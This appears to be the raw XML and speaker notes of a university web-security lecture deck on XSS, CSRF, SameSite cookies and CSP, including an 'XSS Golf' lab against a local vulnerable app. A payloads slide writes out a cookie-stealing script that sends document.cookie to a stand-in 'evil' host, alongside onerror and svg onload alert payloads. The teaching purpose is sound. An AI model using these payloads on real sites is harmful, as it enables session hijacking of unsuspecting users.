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pop an alert(1) on a real site clone, then show the same payload exfiltrating a cookie. "XSS is injection that runs in YOUR browser, as the site you trust."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Roadmap, 1 min. Frame: last week injection hit the server (SQL); this week it hits the client (the DOM). Same root cause, different interpreter (the browser).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 bridge. The interpreter today is the browser's HTML/JS parser. Ask: "what was the one fix for SQLi?" then say: the XSS analogue is context-aware output encoding.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Foundational — XSS is dangerous precisely because injected script runs INSIDE the origin, so SOP protects the attacker's code, not you. Give an origin example: https://a.com:443 vs http://a.com differ.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Drive home: because the script runs as the site, it can do anything the user can. List concrete harms. "Output side" = the bug is in how we render data, not how we store it.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row by row with an example each: reflected = malicious link; stored = a comment that attacks every viewer (worst); DOM = `location.hash` written to innerHTML. Ask which is most dangerous and why (stored — hits everyone). Be clear DOM isn't part of today's graded tasks. ~6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XSS Golf payloads. There's no filter in this app to explain a bypass for — correct that instinct if it comes up. The context point (HTML body vs attribute vs JS vs URL) is still the real learning; `"&gt;` breaks out of an attribute first. ~6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payoff for "context matters" — one escaper is right for some of the 4 sinks and wrong for others, computed live rather than asserted (3 verdicts: EXECUTES / BROKEN / SAFE — a wrecked script tag is not "safe" either). Ties straight into the Defenses slide's "encode per context."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Parallel to Wk4's parameterize slide and Wk6's verify-signature slide. Same shape as SQLi but on the way OUT: the &lt; is the pivot (like ' in SQL), and escaping makes it an entity the HTML parser treats as text, so the script is shown, not run. Stress: this is an OUTPUT bug — the same stored comment is safe once rendered with autoescaping. And escaping is context-dependent (the sim's point): escape for HTML body != attribute != JS != URL. CSP and HttpOnly reduce blast radius but are not the fix — in this lab escaping kills the payload before CSP would ever fire. ~6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Parallel to Wk4's parameterize slide and Wk6's verify-signature slide. Same shape as SQLi but on the way OUT: the &lt; is the pivot (like ' in SQL), and escaping makes it an entity the HTML parser treats as text, so the script is shown, not run. Stress: this is an OUTPUT bug — the same stored comment is safe once rendered with autoescaping. And escaping is context-dependent (the sim's point): escape for HTML body != attribute != JS != URL. CSP and HttpOnly reduce blast radius but are not the fix — in this lab escaping kills the payload before CSP would ever fire. ~6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Consolidation slide — leave it up during XSS Golf. All three states at once: blue = text/data, orange = the &lt; that became a live tag. Point at the orange &lt;script&gt; in row 2 ('one character, and it runs'), then the blue &amp;lt; in row 3 ('an entity — the parser shows it, never runs it'). Same story the xss-context sim animates live across the four sinks. ~3 min.
Diagram: Three versions of the /hello page: normal input you renders as text; injected &lt;script&gt;alert(1)&lt;/script&gt; makes the browser parse a real script tag and run it in the site's origin; and the escaped version &amp;lt;script&amp;gt;... is read as an HTML entity so the browser shows the characters and runs nothing. XSS is an output bug — encode for the context so &lt; can never start a tag.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with XSS: CSRF needs no script on the page — it abuses the browser auto-attaching cookies. Example: a hidden form that POSTs a comment. Don't let "SameSite fixes CSRF" stand unqualified — this week's own fixed_app.py sets SameSite=Strict+HttpOnly+Secure and the CSRF PoC still works, because /comments never checks a session or token at all.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step-by-step version of the bullets just covered — walk both panels left to right once. Land on the footnote: fixed_app.py kills the XSS but the CSRF still works, because encoding an output and checking a token are two unrelated fixes. ~4 min.
Diagram: Two stacked panels comparing stored XSS with CSRF, using the same attacker/server/victim actors. Stored XSS: attacker posts a script, the victim loads it, it runs in the victim's origin and steals the cookie (no HttpOnly) — fixed by output encoding, not SameSite, since the payload is already same-origin. CSRF: the victim visits the attacker's page, which auto-submits a form; the browser attaches the cookie itself and the server can't tell the victim never meant to send it — fixed by SameSite plus a CSRF token the server actually checks, not HttpOnly, since no script ever reads the cookie.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it real. Magecart = the keylogging harm from 2 slides ago, at scale, on a Fortune-500 checkout. Note it often enters via a compromised third-party script — which motivates CSP next.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reference for the worksheet — these three are what's graded this week. Clickjacking (CWE-1021) isn't part of this lab; don't cite it here. ~1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payoff. #1: encode for the OUTPUT CONTEXT (the bug is on output). Modern frameworks auto-escape — the danger is when devs opt out (innerHTML). Be accurate about CSP here: this lab's escaping already neutralizes every payload before CSP would ever matter, so students will NOT see a CSP violation fire in the console today — it's set as a header, its blocking behavior is asserted, not demonstrated, in this sandbox. ~6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before lab: this app is local, not Juice Shop; solo, not a bonus-round competition. The real graded turn is running fixed_app.py and showing escaping stops the golf payloads while CSRF still gets through — that contrast is the point.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Logistics. Step 4 is the one people get backwards: the defended app still falls to CSRF, on purpose — the lesson is that SameSite protects cookie *attachment*, not request *authorization*. Steps 3-4 (defend) are graded. The weekly quiz no longer asks for their scoring payload/sink/flag (dropped — quiz runs before the lab) — that's required in the worksheet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Logistics. Step 4 is the one people get backwards: the defended app still falls to CSRF, on purpose — the lesson is that SameSite protects cookie *attachment*, not request *authorization*. Steps 3-4 (defend) are graded. The weekly quiz no longer asks for their scoring payload/sink/flag (dropped — quiz runs before the lab) — that's required in the worksheet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Before/after + the reasoning note — the CSRF note is graded on getting the SameSite-doesn't-equal-authorization distinction right, not on claiming the defense worked. Remind the AI-resilient tasks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Recap. Cold-call: "where is the XSS bug — input or output?" (output rendering). Second cold-call: "if SameSite=Strict is set, why did CSRF still work today?" (the endpoint never checked who was asking).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Cliffhanger: "Next week — change one number in a URL and read someone else's data; forge a token and become admin." Remind Juice Shop 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691640" cy="6766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783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35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03504" y="22402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XSS &amp; Client-Side Risks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Nutthakorn Chalaemwongwan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security model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XSS: reflected / stored / DOM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+ SameSite cookies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Security Policy (CSP)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Game: XSS Golf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5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— Week 4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= data interpreted as code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queries fix SQLi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 returns today — in the browser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5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security model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Same-Origin Policy (SOP): scripts only read data from same origin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= scheme + host + port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Cookies, DOM, storage scoped per origin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5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XSS = injection into the page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EDF3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258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JavaScript runs in the victim's browser, in the site's origin.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313432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423160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Steal cookies/sessions, keylog, rewrite the page, pivot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OWASP A05:2025 Injection (output side)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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10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flavors of XSS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Type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Where the payload lives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Reflected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in the request, echoed back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Stored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saved server-side, served to others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DOM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client-side JS writes untrusted data to the DOM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191256"/>
            <a:ext cx="8229600" cy="786384"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 930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731520" y="3300984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graded app (vulnerable_app.py) implements reflected + stored only; DOM XSS is optional, via the ungraded Juice Shop target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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9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payloads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932688"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5882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99032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&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;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src=x onerror=alert(1)&gt;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"&gt;&lt;svg onload=alert(1)&gt;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2423160"/>
            <a:ext cx="8229600" cy="1499616"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 487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532888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matters: HTML body vs attribute vs JS vs URL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vulnerable_app.py filters nothing — every payload here fires as-is; the &lt;img onerror&gt; form isn't "the one that sneaks past a filter," it's just 3 characters longer than &lt;script&gt;alert(1)&lt;/script&gt; (28 vs. 25) — a real golf trade-off, not a bypass technique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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10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— one value, four sinks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input, landing in an HTML text node, an unquoted attribute, an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href="…", and a &lt;script&gt; string — at once. Pick an escaper, see which sinks it actually protects.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live: /sim/xss-context (interactive simulation, web only)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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7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fix: encode on output — data renders as text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591056"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3448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99032"/>
            <a:ext cx="786384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vulnerable: raw value concatenated into HTML -&gt; &lt;script&gt; is parsed as a tag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 = "&lt;h1&gt;Hello, " + name + "!&lt;/h1&gt;"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fixed: escape() for the HTML context -&gt; &lt; becomes &amp;lt;, shown as text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 = "&lt;h1&gt;Hello, " + str(escape(name)) + "!&lt;/h1&gt;"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stored comments: Jinja autoescaping renders {{ c }} as text, not markup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3081528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3191256"/>
            <a:ext cx="7680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bug is on output — storing &lt;script&gt; is fine; rendering it unescaped is not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escape() turns &lt; into &amp;lt; — the parser reads an entity (text), never a tag-start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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10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fix: encode on output — data renders as text (cont.)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786384"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 930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for the context (HTML / attribute / JS / URL); CSP + HttpOnly are extra layers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5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XSS in one picture</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 1" descr="Three versions of the /hello page: normal input you renders as text; injected &lt;script&gt;alert(1)&lt;/script&gt; makes the browser parse a real script tag and run it in the site's origin; and the escaped version &amp;lt;script&amp;gt;... is read as an HTML entity so the browser shows the characters and runs nothing. XSS is an output bug — encode for the context so &lt; can never start a tag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360" y="1097280"/>
            <a:ext cx="4983280" cy="3566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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 2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CSRF — riding the user's session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810512"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 404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auto-sends cookies → attacker forges a state-changing request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defenses: anti-CSRF tokens, checking Origin/Referer, and the endpoint actually checking who's asking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SameSite=Strict alone stops the cookie from attaching cross-site — it does not stop a request from being accepted if the endpoint never checks authorization in the first place (today's lab proves this)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5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cookie, opposite directions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 1" descr="Two stacked panels comparing stored XSS with CSRF, using the same attacker/server/victim actors. Stored XSS: attacker posts a script, the victim loads it, it runs in the victim's origin and steals the cookie (no HttpOnly) — fixed by output encoding, not SameSite, since the payload is already same-origin. CSRF: the victim visits the attacker's page, which auto-submits a form; the browser attaches the cookie itself and the server can't tell the victim never meant to send it — fixed by SameSite plus a CSRF token the server actually checks, not HttpOnly, since no script ever reads the cookie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690" y="1097280"/>
            <a:ext cx="3636620" cy="3566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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 2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Real-world: British Airways (2018)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408176"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 519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injected malicious JS (Magecart) into BA's site/app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skimmed credit-card details as users typed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~380k payment records skimmed; ICO proposed a £183M fine, finalized at £20M (2020, ~89% reduction)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898648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EDF3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898648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injection = real money + real fines.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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10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CWE mapping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CWE-79 — Cross-site scripting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CWE-352 — CSRF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CWE-1004 — cookie set without HttpOnly (this week's cookie-theft task)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5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92024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encoding per context (HTML/attr/JS/URL)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auto-escaping (don't bypass with innerHTML/dangerouslySetInnerHTML)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Security Policy — a defense-in-depth header, set alongside escaping — it doesn't replace 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HttpOnly + SameSite cookies; anti-CSRF tokens and an endpoint that actually checks who's asking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5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⛳ Game — XSS Golf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the shortest payload that pops alert(1) / steals a cookie against vulnerable_app.py.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2240280"/>
            <a:ext cx="8229600" cy="1298448"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 563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2350008"/>
            <a:ext cx="7680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scoring by character count (no filter to beat — it's a golf exercise, not a bypass race)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Defend: run fixed_app.py — same payloads, now escaped — then prove CSRF still works against it and explain why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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9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steps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EDF3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258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Worksheet 5 — labs/week05-xss-client-side/worksheet.md (Part 3) · kickoff: docker compose up → http://localhost:8080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2313432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51560" y="2313432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reflected + stored XSS in vulnerable_app.py (DOM XSS via Juice Shop is optional/ungraded)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02920" y="3044952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51560" y="3044952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cookie theft via the stored payload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02920" y="3520440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14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="50292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051560" y="352044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fixed_app.py — confirm output encoding + CSP now block your XSS payloads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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17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steps (cont.)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325880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51560" y="132588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CSRF still succeeds against fixed_app.py — explain why SameSite didn't stop it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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9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719072"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 425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XSS type with payload + context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Escaping + CSP that blocks them (show before/after)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note: why CSRF still succeeds against fixed_app.py despite SameSite=Strict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Audit the AI / EiPE / Prompt Problem (see worksheet)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5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408176"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 519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is injection on the output side — encode for the context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is defense-in-depth, not a substitute for encoding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SameSite cookies stop the cookie attaching cross-site — they don't stop a request being accepted if the endpoint never checks authorization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5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58368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Authentication, sessions &amp; access control</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0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Security · Week 5</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Nutthakorn Chalaemwongwan</dc:creator>
  <cp:lastModifiedBy>Nutthakorn Chalaemwongwan</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-26T16:55:58Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-26T16:55:58Z</dcterms:modified>
</cp:coreProperties>
</file>